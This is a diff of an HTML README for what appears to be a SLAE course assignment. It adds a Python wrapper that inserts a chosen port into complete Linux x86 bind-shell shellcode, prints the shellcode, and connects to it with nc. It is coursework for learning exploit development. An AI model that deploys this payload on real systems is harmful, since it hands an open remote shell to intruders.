@@ -4,7 +4,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
 <title>README</title>
-<!-- 2016-12-16 Fri 14:24 -->
+<!-- 2016-12-18 Sun 21:27 -->
 <meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta  name="generator" content="Org-mode" />
 <meta  name="author" content="Brett Lischalk" />
@@ -172,7 +172,7 @@ Student ID: SLAE-824
 <h3 id="sec-1-1"><span class="section-number-3">1.1</span> Requirements</h3>
 <div class="outline-text-3" id="text-1-1">
 <ul class="org-ul">
-<li>Create a Shell<sub>Bind</sub><sub>TCP</sub> shellcode
+<li>Create a Shell Bind TCP shellcode
 <ul class="org-ul">
 <li>Bind to a port
 </li>
@@ -542,7 +542,7 @@ Lets lookup some values of constants:
 </div>
 
 <p>
-I had a hard time finding where SOCK<sub>STREAM</sub> was defined so we use
+I had a hard time finding where <code>SOCK_STREAM</code> was defined so we use
 a little gcc magic to see what the macro expands to:
 </p>
 
@@ -565,7 +565,7 @@ int lsock = socket(2, SOCK_STREAM, 0);
 <pre class="src src-asm" id="bindshellasm.asm">global _start
 ;; Note: We will store 2 file descriptors along the way
 ;; We will put the listening socket file descriptor in edi
-;; We will put the connection socket file descriptor in esi
+;; We will put the connection socket file descriptor in ebx
 
 section .text
   _start:
@@ -780,8 +780,53 @@ Connect with: <code>nc -nv 127.0.0.1 4444</code>
 
 
 <p>
-And it works! We get our shell. The shellcode is 122 bytes without really
-trying to optimize. We can go back and see if we can do better now.
+And it works! We get our shell. The shellcode is 122 bytes without
+really trying to optimize. We can always go back and try to
+optimize. We also need to update the program to make the port number
+easily configurable.
+</p>
+
+<p>
+Let's write a wrapper script to set our port. We just accept the port
+as a command line argument to our script and interpolate it into our
+shellcode and print out the result:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-python" id="tcp-bind-shell.py">#!/usr/bin/python
+
+#!/usr/bin/python
+
+import sys
+
+if len(sys.argv) != 2:
+  print "Fail!"
+
+port_number     = int(sys.argv[1])
+bts             = [port_number &gt;&gt; i &amp; 0xff for i in (24,16,8,0)]
+filtered        = [b for b in bts if b &gt; 0]
+formatted       = ["\\x" + format(b, 'x') for b in filtered]
+joined          = "".join(formatted)
+
+shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
+shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x02\\x31\\xc9"
+shellcode+="\\x51\\x66\\x68" + joined + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57"
+shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x04\\x31\\xc9\\x51\\x57"
+shellcode+="\\x89\\xe1\\xcd\\x80\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x05\\x31\\xc9\\x51\\x51"
+shellcode+="\\x57\\x89\\xe1\\xcd\\x80\\x31\\xdb\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd"
+shellcode+="\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68"
+shellcode+="\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
+
+print(shellcode)
+</pre>
+</div>
+
+<p>
+Once we have our script we print out our updated shellcode and pop it back
+into our shellcode.c stub program, compile and test a connection. When we do,
+we get our shell again. And even better, we can change the port to whatever we
+would like to yield the proper shellcode.
 </p>
 </div>
 </div>
@@ -789,7 +834,7 @@ trying to optimize. We can go back and see if we can do better now.
 </div>
 <div id="postamble" class="status">
 <p class="author">Author: Brett Lischalk</p>
-<p class="date">Created: 2016-12-16 Fri 14:24</p>
+<p class="date">Created: 2016-12-18 Sun 21:27</p>
 <p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 24.5.1 (<a href="http://orgmode.org">Org</a> mode 8.2.10)</p>
 <p class="validation"><a href="http://validator.w3.org/check?uri=referer">Validate</a></p>
 </div>
